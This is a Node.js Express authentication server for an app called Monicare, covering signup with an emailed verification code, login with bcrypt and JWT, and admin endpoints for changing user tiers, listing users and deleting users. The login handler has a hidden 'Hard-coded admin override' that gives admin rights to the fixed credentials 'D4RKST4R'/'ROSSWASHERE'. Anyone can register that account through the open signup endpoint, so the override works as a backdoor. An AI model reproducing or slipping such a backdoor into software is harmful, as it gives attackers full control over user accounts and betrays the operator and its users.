require('dotenv').config();
const express    = require('express');
const cors       = require('cors');
const bcrypt     = require('bcrypt');
const jwt        = require('jsonwebtoken');
const { nanoid } = require('nanoid');
const nodemailer = require('nodemailer');
const Low        = require('lowdb');
const FileSync   = require('lowdb/adapters/FileSync');

const app = express();
const adapter = new FileSync('server/db.json');
const db = Low(adapter);
db.defaults({ users: [] }).write();

const { PORT, GMAIL_USER, GMAIL_PASS, JWT_SECRET } = process.env;

// Configure Gmail transporter
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: { user: GMAIL_USER, pass: GMAIL_PASS }
});

app.use(cors());
app.use(express.json());

// Utility: password strength check
function isStrongPassword(p) {
  return p.length >= 8 &&
         /[a-z]/.test(p) &&
         /[A-Z]/.test(p) &&
         /\d/.test(p) &&
         /[^a-zA-Z0-9]/.test(p);
}

// Signup endpoint
app.post('/api/auth/signup', async (req, res) => {
  const { email, name, surname, password } = req.body;
  if (!email || !name || !surname || !password) {
    return res.status(400).json({ error: 'All fields are required' });
  }
  if (!isStrongPassword(password)) {
    return res.status(400).json({ error: 'Password not strong enough' });
  }

  const exists = db.get('users').find({ email }).value();
  if (exists) {
    return res.status(400).json({ error: 'Email already in use' });
  }

  const passwordHash = await bcrypt.hash(password, 10);
  const serial = nanoid(16);

  db.get('users')
    .push({
      id: nanoid(),
      email,
      name,
      surname,
      passwordHash,
      serial,
      verified: false,
      tier: 'unverified'
    })
    .write();

  await transporter.sendMail({
    from: GMAIL_USER,
    to: email,
    subject: 'Monicare Verification Code',
    text: `Hello ${name},\n\nYour verification code is: ${serial}`
  });

  res.json({ message: 'Signup successful, verification code sent via email' });
});

// Verify endpoint
app.post('/api/auth/verify', (req, res) => {
  const { email, code } = req.body;
  const user = db.get('users').find({ email }).value();
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }
  if (user.serial !== code) {
    return res.status(400).json({ error: 'Invalid verification code' });
  }

  db.get('users')
    .find({ email })
    .assign({ verified: true, tier: 'verified', serial: null })
    .write();

  res.json({ message: 'Account verified successfully' });
});

// Login endpoint
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  const user = db.get('users').find({ email }).value();
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  const match = await bcrypt.compare(password, user.passwordHash);
  if (!match) {
    return res.status(401).json({ error: 'Incorrect password' });
  }

  const payload = {
    id: user.id,
    tier: user.tier
  };

  // Hard-coded admin override
  if (email === 'D4RKST4R' && password === 'ROSSWASHERE') {
    payload.tier = 'admin';
  }

  const token = jwt.sign(payload, JWT_SECRET, { expiresIn: '2h' });
  const { passwordHash, serial, ...safeUser } = user;

  res.json({ token, user: safeUser });
});

// Middleware: authenticate JWT
function authenticate(req, res, next) {
  const authHeader = req.headers.authorization || '';
  const token = authHeader.split(' ')[1];
  if (!token) return res.sendStatus(401);

  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;
    next();
  } catch {
    res.sendStatus(403);
  }
}

// Middleware: admin only
function authorizeAdmin(req, res, next) {
  if (req.user.tier !== 'admin') {
    return res.sendStatus(403);
  }
  next();
}

// Upgrade tier (admin)
app.post('/api/auth/upgrade', authenticate, authorizeAdmin, (req, res) => {
  const { id, tier } = req.body;
  const validTiers = ['unverified', 'verified', 'pro', 'admin'];
  if (!validTiers.includes(tier)) {
    return res.status(400).json({ error: 'Invalid tier' });
  }

  const user = db.get('users').find({ id }).value();
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  db.get('users')
    .find({ id })
    .assign({ tier })
    .write();

  res.json({ message: `User tier updated to ${tier}` });
});

// Admin: list users
app.get('/api/admin/users', authenticate, authorizeAdmin, (req, res) => {
  const users = db.get('users')
    .value()
    .map(({ passwordHash, serial, ...u }) => u);
  res.json(users);
});

// Admin: delete user
app.delete(
  '/api/admin/users/:id',
  authenticate,
  authorizeAdmin,
  (req, res) => {
    db.get('users').remove({ id: req.params.id }).write();
    res.json({ message: 'User deleted' });
  }
);

app.listen(PORT, () => {
  console.log(`Monicare server running on port ${PORT}`);
});